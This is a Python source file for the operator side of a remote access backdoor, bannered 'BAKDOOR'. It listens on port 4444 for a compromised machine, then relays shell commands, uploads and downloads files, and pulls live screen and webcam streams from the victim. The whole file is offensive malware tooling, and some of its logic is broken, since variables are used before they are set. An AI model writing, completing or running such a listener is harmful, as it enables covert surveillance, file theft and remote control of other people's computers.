import socket
import json
import base64
import time
from datetime import datetime
from vidstream import StreamingServer
from vidstream import ScreenShareClient
import threading
from colorama import Fore, Back, Style, just_fix_windows_console
import keyboard
from sys import stdout

just_fix_windows_console()

now = datetime.now()

current_time = now.strftime("%H:%M:%S")

receiver = StreamingServer('127.0.0.1', 2121)

receiver1 = StreamingServer('127.0.0.1', 3333)

t1 = threading.Thread(target=receiver1.start_server)

t = threading.Thread(target=receiver.start_server)

infoS = ''

pl = Fore.GREEN + Style.BRIGHT + '[+]' + Style.RESET_ALL
ne = Fore.RED + Style.BRIGHT + '[-]' + Style.RESET_ALL

class Listener:
    def __init__(self, ip, port):

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print(Fore.GREEN + '''
        
██████╗  █████╗ ██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝███████║█████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
██████╔╝██║  ██║██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
        ''')
        print(Style.RESET_ALL)
        print(f'listening to ip : {ip} on port : {port}')
        print(f"{pl} Waiting For Incoming Connections")
        self.connection, address = listener.accept()
        print(f"{pl} Got A Connection from " + str(address) + " at " + datetime.now().strftime("%H:%M:%S"))




    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self, data):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        return self.reliable_receive(1024)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return f"{pl} Download Successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def streamVideo(self):
        sender = ScreenShareClient('127.0.0.1', 9999)

        t = threading.Thread(target=sender.start_stream)
        t.start()


    def run(self):
        while True:

            command = input(Fore.GREEN + '>> ' + Style.RESET_ALL)
            command = command.split(" ")

            if command[0] == 'exit' or keyboard.is_pressed('esc'):
                receiver.stop_server()
                receiver1.stop_server()
                self.connection.close()
                exit()
            else:

                try:
                    if command[0] == "upload":
                        file_content = self.read_file(command[1]).decode()
                        command.append(file_content)

                    elif command[0] == 'exit':
                        if streamopen == True:
                            receiver.stop_server()
                        if camopen == True:
                            receiver1.stop_server()
                        time.sleep(5)
                        self.connection.close()
                        exit()

                    if command[0] == "download" and "[-] Error " not in result:
                        result = self.write_file(command[1], result)

                    elif command[0] == "stream":
                        streamopen = True
                        t.start()

                    elif command[0] == "cam":
                        camopen = True
                        t1.start()

                    elif command[0] == "stopstream":
                        streamopen = False
                        receiver.stop_server()

                    elif command[0] == "stopcam":
                        camopen = False
                        receiver1.stop_server()
                    else:
                        result = self.execute_remotely(command)
                except Exception:
                    result = Fore.RED + Style.BRIGHT + f"{ne} Error during command execution" + Style.RESET_ALL

                print(result)



my_listener = Listener("127.0.0.1", 4444)
my_listener.run()




